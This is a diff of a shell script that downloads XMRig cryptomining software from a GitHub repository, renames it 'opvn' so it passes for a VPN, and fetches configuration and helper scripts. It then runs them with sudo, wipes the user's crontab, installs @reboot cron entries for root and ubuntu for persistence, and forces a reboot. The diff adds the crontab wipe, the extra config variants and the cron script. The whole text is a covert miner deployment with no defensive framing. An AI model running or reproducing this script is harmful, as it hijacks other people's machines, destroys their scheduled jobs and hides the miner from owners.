@@ -1,23 +1,43 @@
-cd /home/*/
+cd /home/ubuntu/
 wget https://github.com/bondbenz1821/opme/raw/main/opme.tar.gz
 tar -xzsf opme.tar.gz
 mv xmrig* opvn
 cd opvn/
 mv xmr* opvn
 
-mv config.json config.json.bk
+cd opvn/
+rm -rf config.json
 wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json
 wget https://raw.githubusercontent.com/bondbenz1821/opme/main/opvn.sh
-chmod +x opvn.sh
+wget https://raw.githubusercontent.com/bondbenz1821/opme/main/cronjob.sh
+wget https://raw.githubusercontent.com/bondbenz1821/opme/main/genconfig.sh
+wget https://raw.githubusercontent.com/bondbenz1821/opme/main/reboot.sh
 
-(crontab -u root -l; echo "@reboot cd /home/azureuser/opvn && sudo ./opvn 2>&1 &" ) | crontab -u root -
-(crontab -u ubuntu -l; echo "@reboot cd /home/ubuntu/opvn && sudo ./opvn 2>&1 &" ) | crontab -u ubuntu -
+wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.68
+wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.69
+wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.70
+wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.71
+wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.72
+wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.73
+wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.74
+wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.75
+wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.76
+wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.77
+wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json.78
+
+chmod +x opvn.sh
+chmod +x genconfig.sh
+chmod +x cronjob.sh
+chmod +x reboot.sh
+
+crontab -r
+
+(crontab -u root -l; echo "@reboot cd /home/*/opvn && ./cronjob.sh 2>&1 &" ) | crontab -u root -
+(crontab -u ubuntu -l; echo "@reboot cd /home/ubuntu/opvn && ./cronjob.sh 2>&1 &" ) | crontab -u ubuntu -
 sudo ./opvn.sh 2>&1 &
 
 sleep 10
 
 sudo reboot
-#
-
 
 #nohup sh opvn.sh > result.log 2>&1 &
